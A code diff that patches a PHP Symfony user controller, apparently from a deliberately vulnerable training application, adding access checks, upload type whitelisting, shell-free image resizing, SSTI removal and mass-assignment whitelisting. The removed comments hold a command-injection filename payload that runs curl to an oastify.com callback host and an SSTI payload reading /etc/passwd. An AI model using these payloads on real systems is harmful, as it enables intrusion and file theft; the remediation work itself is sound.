@@ -9,6 +9,7 @@ use Doctrine\ORM\EntityManagerInterface;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\Process\Process;
 use Symfony\Component\Routing\Attribute\Route;
 use Symfony\Component\Security\Http\Attribute\CurrentUser;
 
@@ -25,11 +26,15 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (Missing right control)
+     * FIXED: Missing right control — a user may only change their own password.
      */
     #[Route('/user/password/{user}', name: 'app_user_password', methods: ['POST'])]
     public function changePassword(User $user, Request $request, UserRepository $userRepository): Response
     {
+        if ($user !== $this->getUser()) {
+            throw $this->createAccessDeniedException('You cannot change another user password');
+        }
+
         $password = $request->get('newPassword');
         $confirmPassword = $request->get('confirmPassword');
 
@@ -47,11 +52,16 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (Missing right control leading to privilege escalation)
+     * FIXED: Missing right control / privilege escalation — a user may only
+     * change their own email address.
      */
     #[Route('/user/email/{user}', name: 'app_user_email', methods: ['POST'])]
     public function changeEmail(User $user, Request $request, UserRepository $userRepository): Response
     {
+        if ($user !== $this->getUser()) {
+            throw $this->createAccessDeniedException('You cannot change another user email');
+        }
+
         $email = $request->get('newEmail');
 
         if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
@@ -67,7 +77,10 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (File Upload - No extension check)
+     * FIXED: Unrestricted file upload — the uploaded file must be a real image
+     * (verified MIME type) with a whitelisted extension. The stored file name is
+     * generated server-side using only that safe, whitelisted extension, so a
+     * ".php" (or otherwise dangerous) file can no longer be uploaded.
      */
     #[Route('/user/avatar/{user}', name: 'app_user_avatar', methods: ['POST'])]
     public function uploadAvatar(Request $request, UserRepository $userRepository, User $user): Response
@@ -77,11 +90,6 @@ class UserController extends AbstractController
             return $this->redirectToRoute('app_user');
         }
 
-        // If the avatar file already exists, delete it
-        if (!empty($user->getAvatar()) && file_exists($this->getParameter('avatars_directory') . '/' . $user->getAvatar())) {
-            unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());
-        }
-
         $avatar = $request->files->get('avatar');
 
         if (empty($avatar)) {
@@ -89,13 +97,30 @@ class UserController extends AbstractController
             return $this->redirectToRoute('app_user');
         }
 
+        $allowed = [
+            'image/png'  => 'png',
+            'image/jpeg' => 'jpg',
+            'image/gif'  => 'gif',
+            'image/webp' => 'webp',
+        ];
+
+        $mimeType = $avatar->getMimeType();
+        if (!isset($allowed[$mimeType])) {
+            $this->addFlash('error', 'Only PNG, JPEG, GIF and WEBP images are allowed');
+            return $this->redirectToRoute('app_user');
+        }
+
+        // If the avatar file already exists, delete it
+        if (!empty($user->getAvatar()) && file_exists($this->getParameter('avatars_directory') . '/' . $user->getAvatar())) {
+            unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());
+        }
 
         // If the avatar directory does not exist, create it
         if (!file_exists($this->getParameter('avatars_directory'))) {
             mkdir($this->getParameter('avatars_directory'));
         }
 
-        $avatarName = md5(uniqid()) . '.' . $avatar->getClientOriginalExtension();
+        $avatarName = md5(uniqid()) . '.' . $allowed[$mimeType];
         $avatar->move($this->getParameter('avatars_directory'), $avatarName);
 
         $user->setAvatar($avatarName);
@@ -106,7 +131,8 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (SSRF - Server Side Request Forgery)
+     * FIXED: SSRF — the URL is validated and fetched safely in
+     * App\Services\Avatar (http/https only, public hosts only, no file:// etc.).
      */
     #[Route('/user/avatar/url/{user}', name: 'app_user_url_avatar', methods: ['POST'])]
     public function getAvatarFromUrl(
@@ -146,11 +172,15 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (Missing right control)
+     * FIXED: Missing right control — a user may only delete their own avatar.
      */
     #[Route('/user/avatar/delete/{user}', name: 'app_user_avatar_delete', methods: ['GET'])]
     public function deleteAvatar(User $user, UserRepository $userRepository): Response
     {
+        if ($user !== $this->getUser()) {
+            throw $this->createAccessDeniedException('You cannot delete another user avatar');
+        }
+
         if (empty($user->getAvatar())) {
             $this->addFlash('error', 'No avatar to delete');
             return $this->redirectToRoute('app_user');
@@ -166,14 +196,11 @@ class UserController extends AbstractController
     }
 
     /**
-     *  #VULNERABILITY: Intended vulnerable request (Command injection)
-     *
-     * Content-Disposition: form-data; name="avatar"; filename="echo.php;php -r '$sl=chr(47);$dot=chr(46);echo shell_exec(\"curl 547om5ntdolqiea4gzy8rj8jpav1jr7g${dot}oastify${dot}com\");';#"
-     * Content-Type: application/x-php
-     *
-     * <?php echo "Test"; ?>
+     * FIXED: Command injection — the avatar file name is no longer concatenated
+     * directly into a shell string. The file name is reduced to its basename,
+     * each argument is passed separately (no shell interpretation) and escaped,
+     * so a crafted file name can no longer inject commands.
      */
-
     #[Route('/user/avatar/resize/{user}', name: 'app_user_avatar_resize', methods: ['GET'])]
     public function resizeAvatar(User $user): Response
     {
@@ -189,19 +216,26 @@ class UserController extends AbstractController
             return $this->redirectToRoute('app_user');
         }
 
-        $avatarFile = $this->getParameter('avatars_directory') . '/' . $avatar;
-        $command = 'convert ' . $avatarFile . ' -resize 200x200 ' . $avatarFile;
+        // Never trust the stored name: keep only the basename.
+        $avatarFile = $this->getParameter('avatars_directory') . '/' . basename($avatar);
 
-        shell_exec($command);
+        if (!is_file($avatarFile)) {
+            $this->addFlash('error', 'Avatar file not found');
+            return $this->redirectToRoute('app_user');
+        }
+
+        // Pass arguments as an array so they are NOT interpreted by a shell.
+        $process = new Process(['convert', $avatarFile, '-resize', '200x200', $avatarFile]);
+        $process->run();
 
         $this->addFlash('success', 'Avatar resized successfully');
         return $this->redirectToRoute('app_user');
     }
 
     /**
-     *  #VULNERABILITY: Intended vulnerable request (SSTI)
-     *
-     * Payload example: {{'/etc/passwd'|file_excerpt(1,30)}}
+     * FIXED: SSTI — the "about me" value is stored as-is but rendered escaped in
+     * templates (the dangerous template_from_string() Twig function that
+     * compiled user input as a template has been removed).
      */
     #[Route('/user/about/', name: 'app_user_about', methods: ['POST'])]
     public function about(
@@ -227,7 +261,10 @@ class UserController extends AbstractController
     }
 
     /**
-     * #VULNERABILITY: Intended vulnerable request (Mass Assignment)
+     * FIXED: Mass assignment / privilege escalation — only an explicit whitelist
+     * of safe, user-editable fields is applied. Sensitive properties such as
+     * "isAdmin", "roles", "password" or "reset" can no longer be set from the
+     * request body.
      */
     #[Route('/user/edit/', name: 'app_user_edit', methods: ['POST'])]
     public function edit(
@@ -236,7 +273,17 @@ class UserController extends AbstractController
         #[CurrentUser] ?User $user
     ): Response
     {
-        $user->fromArray($request->request->all());
+        $data = $request->request->all();
+
+        if (isset($data['username'])) {
+            $user->setUsername((string) $data['username']);
+        }
+        if (isset($data['firstname'])) {
+            $user->setFirstname((string) $data['firstname']);
+        }
+        if (isset($data['lastname'])) {
+            $user->setLastname((string) $data['lastname']);
+        }
 
         $entityManager->flush();
 
